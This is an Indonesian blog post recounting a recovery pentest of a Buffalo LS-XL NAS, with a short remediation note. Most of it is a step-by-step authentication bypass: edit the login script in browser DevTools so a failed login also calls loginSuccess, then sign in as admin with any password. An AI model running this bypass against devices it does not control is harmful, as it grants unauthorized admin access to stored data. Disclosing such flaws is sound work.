---
layout: post
title: Pentest NAS Buffalo LS-XL
modified: 2023-01-28T17:00:28+07:00
categories:
description: "Pentest NAS Buffalo LS-XL"
tags: [pentest, exploit, vulnerability, nas]
image:
  background: triangular.png
comments: true
share: true
date: 2023-01-28T17:00:28+07:00
---

Singkat cerita saya membutuhkan akses ke NAS buffalo ls-xl ini yang dimana tipe nas ini sudah sangat jadul akses untuk factory reset dan ganti password pun harus punya master aksesnya dan ternyata master aksesnya lupa sempat frustasi karena harus ada penyelamatan data dan data tersebut data penting perusahaan, sudah cek SN pun di official sudah tidak terdaftar sempat berpikir, why? sehingga saya sedikit pengkodean kreatif untuk coba menyelamatkan. Dan ternyata setelah observasi percobaan pentest, NAS memiliki vulnerability dan exploit melalui injeksi langsung devtools.

## Table of contents

- [Table of contents](#table-of-contents)
- [Proof Of Concept](#poc)
- [Remediasi](#remediasi)

## PoC

Berikut tahapan-tahapan nya:

- Buka halaman login NAS LS-XL (via IP)
- Menggunakan DevTools Chrome dan buka pada bagian sources
- Buka file login_utis.js yang berada pada folder authentication

Dan coba modifikasi code dengan membypass fungsi loginSuccess, hanya memodifikasi bagian kode dibawah ini saja :

```shell
function login(f, lang) {
  if(login_lock != 0) {
    return;
  }
  login_lock = 1;
  var uid = Ext.getCmp('user');
  var uid_value = uid.getValue();
  var pwd = Ext.getCmp('password');
  var pwd_value = pwd.getValue();

  f.form.submit({
    url: '/dynamic.pl',
    params: {
      bufaction: 'verifyLogin'
    },
    waitTitle: S('Please Wait...'),
    waitMsg: S('Logging In...'),
    success: function(form, action) {
      var decodedResponse = Ext.decode(action.response.responseText);
      var jsonData = decodedResponse.data;
      loginSuccess(f, action, uid_value, lang);
    },
    failure: function(form, action) {
      loginSuccess(f, action, uid_value, lang);
    }
  });
};
```

- Save Ctrl+S
- login dengan username admin dengan password bebas
- Reset akun admin dengan password baru

Terdapat keamanan yang buruk pada NAS dalam hal ini dapat mensolusikan penyelamatan data, saya sengaja melakukan ini dan pentest karena terdesak dan data tersebut penting. mohon untuk tidak dicoba-coba untuk digunakan dengan hal yang tidak diinginkan ya saya disini hanya share untuk penyelamatan data saja dan buntu.


## Remediasi

Tidak untuk dicoba-coba segera untuk anda pemilik NAS simpan password dan akun master anda jangan sampai lupa, dan lakukan langsung update patching software terbaru dari official vendor NAS anda.

